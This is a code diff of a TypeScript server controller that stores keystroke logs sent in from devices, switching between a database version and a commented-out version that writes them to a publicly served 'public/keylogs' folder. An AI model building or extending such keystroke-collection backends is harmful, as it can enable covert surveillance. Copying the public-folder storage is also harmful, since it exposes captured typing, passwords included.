@@ -6,70 +6,70 @@ import KeyLogs from "../models/keylogs.model";
 import { KeyLogsModelType } from "../utils";
 
 // Add New KeyLogs
-// export const addNewKeyLogs = async (data: any) => {
-// 	try {
-// 		const { deviceId, keyLogsType, keylogs, event } = data;
-
-// 		const newKeyLog: KeyLogsModelType = new KeyLogs({
-// 			deviceId,
-// 			keyLogsType,
-// 			keylogs: keylogs,
-// 			keyevent: event,
-// 		});
-
-// 		await newKeyLog.save();
-
-// 		return { status: 200, message: "Key logs added successfully" };
-// 	} catch (error) {
-// 		console.error("Error adding key logs:", error);
-// 		return { status: 500, error: "Failed to add key logs" };
-// 	}
-// };
-
-// Add New KeyLogs
 export const addNewKeyLogs = async (data: any) => {
 	try {
 		const { deviceId, keyLogsType, keylogs, event } = data;
 
-		// Check if keylogs is not an empty string
-		if (!keylogs || keylogs.trim() === "[]") {
-			return {
-				status: 400,
-				message: "Key logs are empty, nothing to save",
-			};
-		}
+		const newKeyLog: KeyLogsModelType = new KeyLogs({
+			deviceId,
+			keyLogsType,
+			keylogs: keylogs,
+			keyevent: event,
+		});
 
-		// Create a username folder if it doesn't exist
-		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
-		if (!fs.existsSync(logsDir)) {
-			fs.mkdirSync(logsDir, { recursive: true });
-		}
+		await newKeyLog.save();
 
-		// Get today's date in YYYY-MM-DD format for the file name
-		const today = new Date().toISOString().split("T")[0];
-		const filePath = path.join(logsDir, `${today}.txt`);
-
-		// Format the log entry to only include time (hh:mm:ss)
-		const formatTime = (date: Date) => {
-			const hours = String(date.getHours()).padStart(2, "0");
-			const minutes = String(date.getMinutes()).padStart(2, "0");
-			const seconds = String(date.getSeconds()).padStart(2, "0");
-			return `${hours}:${minutes}:${seconds}`;
-		};
-
-		const formattedDate = formatTime(new Date());
-
-		// Prepare the log entry with the formatted date
-		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
-
-		// Append the log entry to the file
-		fs.appendFileSync(filePath, logEntry);
-		console.log(`Added new key log entry to: ${filePath}`);
+		return { status: 200, message: "Key logs added successfully" };
 	} catch (error) {
 		console.error("Error adding key logs:", error);
 		return { status: 500, error: "Failed to add key logs" };
 	}
 };
+
+// Add New KeyLogs
+// export const addNewKeyLogs = async (data: any) => {
+// 	try {
+// 		const { deviceId, keyLogsType, keylogs, event } = data;
+
+// 		// Check if keylogs is not an empty string
+// 		if (!keylogs || keylogs.trim() === "[]") {
+// 			return {
+// 				status: 400,
+// 				message: "Key logs are empty, nothing to save",
+// 			};
+// 		}
+
+// 		// Create a username folder if it doesn't exist
+// 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
+// 		if (!fs.existsSync(logsDir)) {
+// 			fs.mkdirSync(logsDir, { recursive: true });
+// 		}
+
+// 		// Get today's date in YYYY-MM-DD format for the file name
+// 		const today = new Date().toISOString().split("T")[0];
+// 		const filePath = path.join(logsDir, `${today}.txt`);
+
+// 		// Format the log entry to only include time (hh:mm:ss)
+// 		const formatTime = (date: Date) => {
+// 			const hours = String(date.getHours()).padStart(2, "0");
+// 			const minutes = String(date.getMinutes()).padStart(2, "0");
+// 			const seconds = String(date.getSeconds()).padStart(2, "0");
+// 			return `${hours}:${minutes}:${seconds}`;
+// 		};
+
+// 		const formattedDate = formatTime(new Date());
+
+// 		// Prepare the log entry with the formatted date
+// 		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
+
+// 		// Append the log entry to the file
+// 		fs.appendFileSync(filePath, logEntry);
+// 		console.log(`Added new key log entry to: ${filePath}`);
+// 	} catch (error) {
+// 		console.error("Error adding key logs:", error);
+// 		return { status: 500, error: "Failed to add key logs" };
+// 	}
+// };
 
 // Get Key Logs by DeviceId
 export const getKeyLogsFiles = async (req: Request, res: Response) => {
